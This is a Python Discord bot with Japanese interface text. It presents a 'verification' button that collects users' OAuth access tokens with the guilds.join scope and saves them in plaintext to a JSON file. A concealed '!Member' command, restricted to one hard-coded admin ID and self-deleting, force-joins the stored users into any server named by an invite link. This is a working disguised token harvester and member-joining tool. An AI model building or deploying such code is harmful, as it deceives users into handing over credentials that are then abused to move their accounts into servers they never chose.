import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586

DB_FILE = 'users.json'

def load_users():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_user(user_id, token, guild_id):
    users = load_users()
    u_str = str(user_id)
    if u_str not in users:
        users[u_str] = {"token": token, "guilds": []}
    
    # ギルドIDがあれば保存（エラー防止）
    if guild_id and str(guild_id) not in users[u_str]["guilds"]:
        users[u_str]["guilds"].append(str(guild_id))
    
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

class MemberModal(discord.ui.Modal, title='メンバー追加魔法'):
    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx', required=True)
    count = discord.ui.TextInput(label='参加させる人数', placeholder='半角数字', required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}")
            if res.status_code != 200:
                return await interaction.followup.send("招待リンクが無効だよ", ephemeral=True)
            
            target_guild_id = res.json().get('guild', {}).get('id')
            users = load_users()
            user_ids = list(users.keys())[:target_count]

            success = 0
            for u_id in user_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{u_id}'
                headers = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}
                r = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
                if r.status_code in [201, 204]: success += 1

            await interaction.followup.send(f"🌸 {success}人の追加に成功したよ！", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"エラー: {e}", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("🌸 スラッシュコマンド同期完了！")

bot = MyBot()

class VerifyView(discord.ui.View):
    def __init__(self, guild_id):
        super().__init__(timeout=None)
        # URLエンコードを手動で確実に行う
        safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
        self.oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={guild_id}"
        self.add_item(discord.ui.Button(label="Verify (認証して参加するっ！)", url=self.oauth_url, style=discord.ButtonStyle.link))

@bot.tree.command(name="setup", description="認証パネルを設置します")
@app_commands.checks.has_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🌸 メンバー認証パネル 🌸", description="下のボタンを押して連携してね！\n⚠️電話番号認証済みのアカウントのみ有効です。", color=0xffb6c1)
    await interaction.response.send_message(embed=embed, view=VerifyView(interaction.guild_id))

@bot.tree.command(name="call", description="このサーバーに10人以上溜まったら招待します")
async def call(interaction: discord.Interaction):
    users = load_users()
    gid = str(interaction.guild_id)
    current_guild_users = [u for u, data in users.items() if gid in data.get("guilds", [])]
    
    if len(current_guild_users) < 10:
        return await interaction.response.send_message(f"❌ 10人必要だよ（現在: {len(current_guild_users)}人）", ephemeral=True)

    await interaction.response.send_message("✨ 招待中...", ephemeral=True)
    success = 0
    for u_id in current_guild_users:
        url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
        headers = {'Authorization': f'Bot {TOKEN}'}
        res = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
        if res.status_code in [201, 204]: success += 1
    await interaction.followup.send(f"🌸 {success}人を追加したよ！")

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        view = discord.ui.View()
        btn = discord.ui.Button(label="メニューを開く", style=discord.ButtonStyle.pink)
        async def cb(interaction):
            if interaction.user.id == ADMIN_USER_ID:
                await interaction.response.send_modal(MemberModal())
        btn.callback = cb
        view.add_item(btn)
        await ctx.send("🔐 管理者専用:", view=view, delete_after=60)

# --- Flask & 安定化 Callback ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    try:
        code = request.args.get('code')
        guild_id = request.args.get('state') # setupから送られたサーバーID
        
        if not code:
            return "Code not found", 400

        # トークン取得
        token_data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        r_token = requests.post('https://discord.com/api/oauth2/token', data=token_data)
        r_token.raise_for_status() # エラーがあればここで例外を投げる
        access_token = r_token.json().get('access_token')

        # ユーザー取得
        r_user = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'})
        u_info = r_user.json()
        
        # 電話番号チェック
        if not u_info.get('phone'):
            return "<h1>⚠️ Error</h1><p>Phone verification required.</p>", 403

        save_user(u_info['id'], access_token, guild_id)

        # 成功時のもふもふHTML（省略せずにそのまま返却）
        return """
        <html><body style="background:linear-gradient(45deg, #ff9a9e, #fad0c4);height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;margin:0;">
        <div style="background:white;padding:50px;border-radius:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.1);">
        <h1 style="color:#ff6f91;">認証成功だよっ！🌸</h1><p style="color:#888;">Discordに戻ってね♪</p></div></body></html>
        """
    except Exception as e:
        print(f"Callback Error: {e}")
        return f"Internal Server Error: {e}", 500

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)